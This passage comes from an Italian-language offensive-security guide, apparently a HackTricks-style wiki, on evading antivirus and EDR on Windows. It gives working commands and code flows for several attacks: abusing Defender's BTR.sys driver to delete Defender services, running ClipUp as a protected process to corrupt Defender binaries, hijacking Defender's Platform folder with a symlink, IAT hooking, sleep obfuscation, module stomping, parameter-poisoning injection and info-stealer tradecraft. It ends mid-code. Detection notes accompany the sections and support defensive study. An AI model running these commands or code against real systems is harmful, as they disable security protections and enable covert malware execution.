[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa la chain completa: estrae `BTR.sys` dal Defender locale, crea `<random>.sys:changelist` e uno stream di feedback, serializza/verifica tramite checksum/cifra le action concatenate, crea direttamente la registry key del service, quindi chiama `NtLoadDriver` per `-trigger now` oppure lascia il driver come driver di system-start per `-trigger boot`. Lo staging diretto nel registro evita il normale percorso SCM `CreateServiceW` e pertanto **non** produce l'Event ID 7045 relativo all'installazione del service. Gli artifact attivati al boot possono essere rimossi in seguito con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` non è utilizzabile perché BTR esegue operazioni di I/O sui file da `DriverEntry`, prima che lo storage stack e il link `SystemRoot` siano pronti. `Start=1`, insieme al gruppo `Boot Bus Extender` ad alta priorità, viene invece eseguito nella Phase 1: NTFS è utilizzabile, ma molti security driver con avvio insieme al sistema e servizi EDR in user-mode non sono ancora stati inizializzati. I filtri con avvio al boot, come `WdFilter`, potrebbero essere già caricati; tuttavia, BTR può rimuovere i loro binari o la configurazione dei servizi prima dell'avvio successivo e può eliminare gli eseguibili dei servizi prima che SCM li avvii. ELAM non chiude questa lacuna perché BTR viene eseguito dopo la valutazione dei componenti con avvio al boot e dispone di una firma Microsoft valida.<sup>[[36]](#references)</sup>

Più azioni vengono eseguite in un'unica transazione. Il PoC antepone l'Action 1 per il percorso hard-coded `\SystemRoot\Temp\BootClean.log`: BTR crea questo log, quindi consuma la propria richiesta di eliminazione e lo rimuove prima dell'unload. Questo riduce le evidenze, mentre inserire il feedback in `<random>.sys:<random>.dat` consente di rimuovere insieme il driver e entrambi gli stream.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlazioni ad alto segnale

Le regole basate solo sulle firme e la Microsoft vulnerable-driver blocklist non affrontano l'abuso delle funzionalità previste di BTR. Preferire queste correlazioni comportamentali, distinguendo al contempo la lineage legittima di Defender da un launcher arbitrario.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creazione di `.sys:changelist` è universale per lo staging di BTR. Un ADS `.dat` collegato allo stesso `.sys` è particolarmente sospetto, perché Defender in condizioni normali inserisce il feedback in `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 senza System 7045:** correlare la creazione diretta di `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenente `Args=...:changelist` e `Group=Boot Bus Extender` senza un evento di installazione SCM corrispondente.
- **Sysmon 6 -> 23:** correlare il caricamento di un driver BTR noto proveniente da una lineage non-Defender con la successiva eliminazione di file attribuita a `System`/PID 4, in particolare per i binari di sicurezza.
- **Sysmon 11 -> 23:** generare un alert per la rapida creazione ed eliminazione di `\SystemRoot\Temp\BootClean.log` da parte di `System`/PID 4.
- Limitare e verificare l'assegnazione/abilitazione di `SeLoadDriverPrivilege`; una firma Microsoft da sola non è sufficiente come garanzia di affidabilità quando il driver di uno security tool viene sottoposto a staging da `cmd.exe`, PowerShell o un processo sconosciuto.

## Abusare di Protected Process Light (PPL) per manomettere AV/EDR con LOLBIN

Protected Process Light (PPL) impone una gerarchia signer/level, in modo che solo i processi protetti con livello uguale o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se è possibile avviare legittimamente un binario abilitato per PPL e controllarne gli argomenti, è possibile convertire una funzionalità benigna (ad esempio il logging) in una write primitive limitata e basata su PPL contro directory protette utilizzate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa fa eseguire un processo come PPL
- L'EXE target (e tutte le DLL caricate) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un protection level compatibile che corrisponda al signer del binario (ad esempio `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i signer anti-malware, `PROTECTION_LEVEL_WINDOWS` per i signer Windows). Livelli errati causeranno il fallimento della creazione.

Vedere anche un'introduzione più ampia a PP/PPL e alla protezione di LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti di launcher
- Helper open-source: CreateProcessAsPPL (seleziona il protection level e inoltra gli argomenti all'EXE target):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Pattern di utilizzo:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si avvia autonomamente e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con i privilegi PPL.
- ClipUp non può analizzare percorsi contenenti spazi; usa i percorsi brevi 8.3 per puntare a posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elenca i nomi brevi: `dir /x` in ogni directory padre.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avvia il LOLBIN compatibile con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (ad esempio CreateProcessAsPPL).
2) Passa l'argomento relativo al percorso del log di ClipUp per forzare la creazione di un file in una directory AV protetta (ad esempio Defender Platform). Usa i nomi brevi 8.3 se necessario.
3) Se il binario di destinazione è normalmente aperto/bloccato dall'AV durante l'esecuzione (ad esempio MsMpEng.exe), pianifica la scrittura all'avvio, prima che l'AV venga avviato, installando un servizio ad avvio automatico che venga eseguito in modo affidabile in precedenza. Convalida l'ordine di avvio con Process Monitor (registrazione dell'avvio).
4) Al riavvio, la scrittura supportata da PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file di destinazione e impedendone l'avvio.

Esempio di invocazione (percorsi oscurati/abbreviati per motivi di sicurezza):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare il contenuto scritto da ClipUp, ma solo la posizione; questa primitive è adatta alla corruzione piuttosto che all'iniezione precisa di contenuti.
- Richiede privilegi di amministratore locale/SYSTEM per installare/avviare un service e una finestra temporale per il reboot.
- Il timing è critico: il target non deve essere aperto; l'esecuzione al boot evita i file lock.

Rilevamenti
- Creazione del processo `ClipUp.exe` con argomenti insoliti, soprattutto quando il processo padre è un launcher non standard, in prossimità del boot.
- Nuovi service configurati per avviare automaticamente binari sospetti e che vengono avviati costantemente prima di Defender/AV. Analizza la creazione/modifica dei service prima dei failure di avvio di Defender.
- Monitoraggio dell'integrità dei file sui binari/directory Platform di Defender; creazioni/modifiche impreviste da parte di processi con protected-process flags.
- Telemetria ETW/EDR: cerca processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo del livello PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limita quali binari firmati possono essere eseguiti come PPL e da quali processi padre; blocca l'invocazione di ClipUp al di fuori dei contesti legittimi.
- Igiene dei service: limita la creazione/modifica dei service ad avvio automatico e monitora la manipolazione dell'ordine di avvio.
- Assicurati che la tamper protection di Defender e le protezioni early-launch siano abilitate; analizza gli errori di avvio che indicano la corruzione dei binari.
- Valuta la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano gli strumenti di sicurezza, se compatibile con il tuo ambiente (testa accuratamente).

## Tampering di Microsoft Defender tramite Hijack di un Symlink della Cartella Platform Version

Windows Defender sceglie la Platform da cui viene eseguito enumerando le sottocartelle presenti in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (ad esempio `4.18.25070.5-0`), quindi avvia da lì i processi del service di Defender (aggiornando di conseguenza i path del service/registro). Questa selezione si basa sulle directory entry, inclusi i directory reparse point (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender verso un path scrivibile dall'attacker e ottenere DLL sideloading o una service disruption.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di eseguire un reboot o attivare una nuova selezione della Platform di Defender (restart del service al boot)
- Sono necessari solo strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della Platform si basa sulle directory entry e sceglie la versione lessicograficamente più alta senza verificare che il target punti a un path protetto/attendibile.

Procedura passo-passo (esempio)
1) Prepara un clone scrivibile della cartella Platform corrente, ad esempio `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con una versione superiore all'interno di Platform, puntando alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Opzioni post-exploitation
- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce privilege escalation da sola; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing con PIC (in stile Crystal Kit)

I red team possono spostare la runtime evasion dal C2 implant direttamente nel target module eseguendo l’hooking della sua Import Address Table (IAT) e instradando API selezionate attraverso codice position-independent (PIC) controllato dall’attaccante. Questo generalizza l’evasion oltre la ridotta superficie API esposta da molti kit (ad esempio, CreateProcessA) ed estende le stesse protezioni a BOF e post-exploitation DLL.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio di alto livello
- Stage di un blob PIC accanto al target module utilizzando un reflective loader (anteposto o companion). Il PIC deve essere self-contained e position-independent.
- Durante il caricamento della host DLL, attraversare il suo IMAGE_IMPORT_DESCRIPTOR e modificare le entry della IAT per gli import target (ad esempio, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), facendole puntare a sottili wrapper PIC.
- Ogni wrapper PIC esegue le evasion prima di effettuare il tail-call verso l’indirizzo della real API. Le evasion tipiche includono:
- Memory mask/unmask attorno alla call (ad esempio, cifrare le regioni del beacon, RWX→RX, modificare i nomi/le permission delle pagine), quindi ripristinarle dopo la call.
- Call-stack spoofing: costruire uno stack benigno ed effettuare la transizione verso la target API in modo che l’analisi del call stack risolva i frame previsti.<sup>[[9]](#references)</sup>
- Per garantire la compatibilità, esportare un’interfaccia affinché uno script Aggressor (o equivalente) possa registrare le API da sottoporre a hook per Beacon, BOF e post-ex DLL.

Perché utilizzare l’IAT hooking in questo caso
- Funziona con qualsiasi codice che utilizzi l’import sottoposto a hook, senza modificare il codice del tool o fare affidamento su Beacon per effettuare il proxy di API specifiche.
- Copre le post-ex DLL: l’hooking di LoadLibrary* consente di intercettare i caricamenti dei moduli (ad esempio, System.Management.Automation.dll, clr.dll) e applicare la stessa masking/stack evasion alle loro API call.
- Ripristina l’uso affidabile dei post-ex command per la creazione di processi contro le detection basate sul call stack, tramite il wrapping di CreateProcessA/W.

Schema minimo di IAT hook (pseudocodice C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocations/ASLR e prima del primo utilizzo dell'import. I reflective loader come TitanLdr/AceLdr dimostrano l'hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper ridotti e PIC-safe; risolvi la vera API tramite il valore IAT originale acquisito prima della patch oppure tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per il PIC ed evita di lasciare pagine writable+executable.

Call-stack spoofing stub
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate falsa (indirizzi di ritorno all'interno di moduli benigni) e poi eseguono il pivot verso la vera API.
- Questo elude i rilevamenti che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Combinali con tecniche di stack cutting/stack stitching per atterrare nei frame attesi prima del prologo dell'API.

Integrazione operativa
- Anteponi il reflective loader alle DLL post-ex, in modo che il PIC e gli hook vengano inizializzati automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target, così Beacon e BOFs beneficiano in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Considerazioni su detection/DFIR
- Integrità IAT: entry che risolvono in indirizzi non appartenenti a immagini (heap/anon); verifica periodica dei puntatori agli import.
- Anomalie dello stack: indirizzi di ritorno che non appartengono a immagini caricate; transizioni improvvise verso PIC non appartenenti a immagini; ancestry incoerente di RtlUserThreadStart.
- Telemetria del loader: scritture in-process sulla IAT, attività precoce del DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione del caricamento delle immagini: se fai hooking di LoadLibrary*, monitora i caricamenti sospetti di assembly automation/clr correlati a eventi di memory masking.

Building block ed esempi correlati
- Reflective loader che eseguono l'IAT patching durante il caricamento (ad es., TitanLdr, AceLdr)
- Hook di memory masking (ad es., simplehook) e PIC di stack-cutting (stackcutting)
- Stub PIC di call-stack spoofing (ad es., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks tramite un PICO residente

Se controlli un reflective loader, puoi fare hooking degli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver personalizzato che verifica prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Costruisci un **PICO residente** (oggetto PIC persistente) che sopravviva dopo che il loader PIC transiente si è liberato.
- Esporta una funzione `setup_hooks()` che sovrascriva l'import resolver del loader (ad es., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, ignora gli import ordinali e usa una ricerca degli hook basata su hash come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook al link time con le entry `addhook "MODULE$Func" "hook"` di Crystal Palace. L'hook rimane valido perché risiede all'interno del PICO residente.

Questo produce una **redirezione IAT all'import-time** senza patchare la code section della DLL caricata dopo il caricamento.

### Forzare gli import hookable quando il target usa il PEB-walking

Gli hook import-time si attivano solo se la funzione è effettivamente nella IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza import entry), forza un import reale affinché il percorso `ProcessImports()` del loader lo intercetti:

- Sostituisci la risoluzione degli export basata su hash (ad es., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore genera una entry IAT, consentendo l'interception quando il reflective loader risolve gli import.

### Sleep/idle obfuscation in stile Ekko senza patchare `Sleep()`

Invece di patchare `Sleep`, fai hooking delle **primitive effettive di wait/IPC** usate dall'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per le attese lunghe, avvolgi la chiamata in una catena di obfuscation in stile Ekko che cifra l'immagine in memoria durante l'idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` appositamente creati.
- Catena tipica (x64): imposta l'immagine su `PAGE_READWRITE` → cifra con RC4 tramite `advapi32!SystemFunction032` l'intera immagine mappata → esegui la wait bloccante → decifra con RC4 → **ripristina i permessi per sezione** attraversando le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un template `CONTEXT`; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni passaggio.

Dettaglio operativo: restituisci “success” per le wait lunghe (ad es., `WAIT_OBJECT_0`) affinché il chiamante prosegua mentre l'immagine è mascherata. Questo pattern nasconde il modulo agli scanner durante le finestre di idle ed evita la classica signature di `Sleep()` “patchato”.

Idee per la detection (basate sulla telemetria)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- `advapi32!SystemFunction032` utilizzato su buffer contigui di grandi dimensioni pari a quelle dell'immagine.
- `VirtualProtect` su intervalli estesi seguito dal ripristino personalizzato dei permessi per sezione.

### Registrazione runtime CFG per i gadget di sleep-obfuscation

Sui target con CFG abilitato, il primo salto indiretto verso un gadget mid-function come `jmp [rbx]` o `jmp rdi` normalmente causa il crash del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadata CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken all'interno di processi hardened:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta usata dalla catena con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entry `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all'interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), il `MEMORY_RANGE_ENTRY` deve iniziare alla **image base** e coprire la **dimensione completa dell'immagine**.
- Per regioni mappate manualmente/PIC/stomped, usa invece l'**allocation base** e la dimensione dell'allocazione.
- Contrassegna non solo il dispatch gadget, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscall di wait/event) e tutte le sezioni executable controllate dall'attaccante che diventeranno destinazioni indirette.

Questo trasforma le catene di sleep in stile ROP/JOP da “funzionano solo nei processi non-CFG” in una primitiva riutilizzabile per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Stack spoofing compatibile con CET per thread in sleep

La sostituzione completa del `CONTEXT` è rumorosa e può fallire sui sistemi con CET Shadow Stack, perché un `Rip` contraffatto deve comunque essere coerente con lo shadow stack hardware. Un pattern più sicuro per il sleep-masking è:<sup>[[30]](#references)</sup>

- Scegli un altro thread nello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Acquisisci il contesto reale del thread in sleep con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto contraffatto, lasciando invariati `Rsp`/lo stato dello stack contraffatti.
- Durante la finestra di sleep, copia l'`NT_TIB` del thread contraffatto nel TEB corrente, così gli stack walker eseguono l'unwind all'interno di un intervallo di stack legittimo.
- Al termine della wait, ripristina il TIB originale e il contesto del thread.

Questo preserva un instruction pointer coerente con CET, inducendo però in errore gli stack walker EDR che si fidano dei metadata dello stack del TEB per validare gli unwind.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue produce troppe signature, la stessa sequenza sleep-encrypt-spoof-restore può essere eseguita da un helper thread sospeso usando APC accodate:<sup>[[27]](#references)</sup>

- Crea un helper thread con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC preparati con `NtQueueApcThread` e svuota la coda con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell'heap invece che nello stack dell'helper, per evitare di esaurire lo stack predefinito del thread da 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l'evento di avvio e bloccare il thread.
- Sospendi il thread principale prima di ripristinare TIB/contesto (`NtSuspendThread` → restore → `NtResumeThread`) per ridurre la race window in cui uno scanner potrebbe rilevare uno stack parzialmente ripristinato.

Questo sostituisce la signature `CreateTimerQueueTimer` + `NtContinue` con una signature helper-thread/APC, mantenendo gli stessi obiettivi di RC4 masking e stack spoofing.

Ulteriori idee per la detection
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, wait o dispatch APC.
- `GetThreadContext`/`SetThreadContext` avvolti attorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di brevi signature di gadget come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all'interno di moduli firmati.


## Precision Module Stomping

Il module stomping esegue i payload dalla **sezione `.text` di una DLL già mappata all'interno del processo target**, invece di allocare memoria executable privata evidente o caricare una nuova DLL sacrificale. Il target della sovrascrittura dovrebbe essere un'**immagine caricata e disk-backed**, il cui spazio di codice possa contenere il payload senza corrompere i code path ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Selezione affidabile del target

Il module stomping ingenuo contro moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una code region troppo piccola potrebbe causare il crash del processo. Un workflow più affidabile è:

1. Enumera i moduli del processo target e conserva una **include list contenente solo i nomi** delle DLL già caricate.
2. Costruisci prima il payload e registra la sua **dimensione esatta in byte**.
3. Analizza le DLL candidate su disco e confronta `Misc_VirtualSize` della sezione PE **`.text`** con la dimensione del payload. Questo è più importante della dimensione del file perché riflette la dimensione della sezione executable **quando viene mappata in memoria**.
4. Analizza la **Export Address Table (EAT)** e scegli l'RVA di una funzione esportata come offset iniziale dello stomp.
5. Calcola il **blast radius**: se il payload supera il limite della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Helper tipici di recon/selezione osservati in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Note operative
- Preferire le DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/caricamenti imprevisti di immagini.
- Preferire export eseguiti raramente dall'applicazione target; altrimenti i normali percorsi di codice potrebbero raggiungere i byte modificati prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni spesso richiedono di modificare l'inclusione dello shellcode da una stringa letterale a un **byte-array/braced initializer**, affinché l'intero buffer venga rappresentato correttamente nel sorgente dell'injector.

Idee per il rilevamento
- Scritture remote in **pagine eseguibili supportate da immagini** (`MEM_IMAGE`, `PAGE_EXECUTE*`) invece delle più comuni allocazioni private RWX/RX.
- Entry point degli export i cui byte in memoria non corrispondono più al file di supporto su disco.
- Thread remoti o pivot del contesto che iniziano l'esecuzione all'interno di un export legittimo di una DLL i cui primi byte sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` sulle pagine `.text` delle DLL, seguite dalla creazione di un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Anziché copiare byte in un target già in esecuzione, sfrutta il fatto che Windows **copia parametri di avvio selezionati di `CreateProcessW` nel processo figlio** e li memorizza all'interno di `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carrier avvelenabili copiati da `CreateProcessW`

I carrier utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei carrier:

- `lpCommandLine` deve puntare a memoria **scrivibile** per `CreateProcessW` ed è limitato a **32.767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un blocco di ambiente Unicode composto da stringhe successive `NAME=VALUE\0`, terminate da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi il mapping a `ShellInfo` deve essere trattato come un dettaglio di implementazione anziché come un contratto documentato stabile.

Questo trasforma la normale creazione di processi nella **primitiva di trasferimento del payload**. L'operatore crea il processo figlio con dati di avvio controllati dall'attaccante e lascia che sia Windows a eseguire la copia tra processi.

### Flusso di lookup remoto senza API di scrittura remota

Dopo la creazione del processo figlio, risolvere il buffer copiato con primitive di sola lettura:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottenere `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggere il `PEB` remoto
3. Seguire `PEB.ProcessParameters`
4. Leggere `RTL_USER_PROCESS_PARAMETERS`
5. Utilizzare il puntatore selezionato:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Flusso minimo:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Esecuzione del parameter buffer copiato

La regione dei parametri copiata è solitamente `RW`, non eseguibile. Una catena P3 comune è:

1. Creare normalmente il processo (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del main thread già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivendo `RIP`)

A differenza dei workflow classici di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il context può essere modificato direttamente sull'handle del main thread restituito.

Questo evita diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limitazione dei byte nulli e staged shellcode

Tutti e tre i carrier sono **dati stringa o simili a stringhe**, quindi un payload raw contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è un **primo stage null-free** che ricostruisce le costanti a runtime e poi carica un secondo stage arbitrario.

Un pattern semplice è la sintesi delle costanti basata su XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Questo permette al first stage di costruire stringhe per lo stack, argomenti API, percorsi DLL o un loader shellcode di second stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal first stage

Quando il first stage deve chiamare API come `LoadLibraryA`, può:

- eseguire il push della stringa/buffer sullo stack del target
- riservare la **32-byte x64 shadow space**
- impostare `RCX`, `RDX`, `R8`, `R9` su costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un second stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, convertito in `PAGE_EXECUTE_READ` con `VirtualProtect` e raggiunto tramite un jump, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono **eseguibili le pagine dei parametri del processo**
- tale modifica dei permessi seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote del `PEB` e successivamente di `RTL_USER_PROCESS_PARAMETERS`
- valori `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` insolitamente lunghi / ad alta entropia durante la creazione del processo

### Note

- P3 è un **cross-process transfer trick**, non una primitiva di esecuzione completa di per sé: il parametro copiato necessita comunque di una modifica dei permessi per l'esecuzione e di un metodo di redirezione dell'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stato considerato dagli autori, ma scartato perché raggiunge internamente primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Tradecraft di SantaStealer per l'evasion senza file e il furto di credenziali

SantaStealer (alias BluelineStealer) illustra come i moderni info-stealer combinino AV bypass, anti-analysis e accesso alle credenziali in un singolo workflow.<sup>[[24]](#references)</sup>

### Controllo del layout della tastiera e ritardo del sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout della tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, assicurando che non venga mai eseguito nelle locale escluse e lasciando al contempo un artefatto utile per l'hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
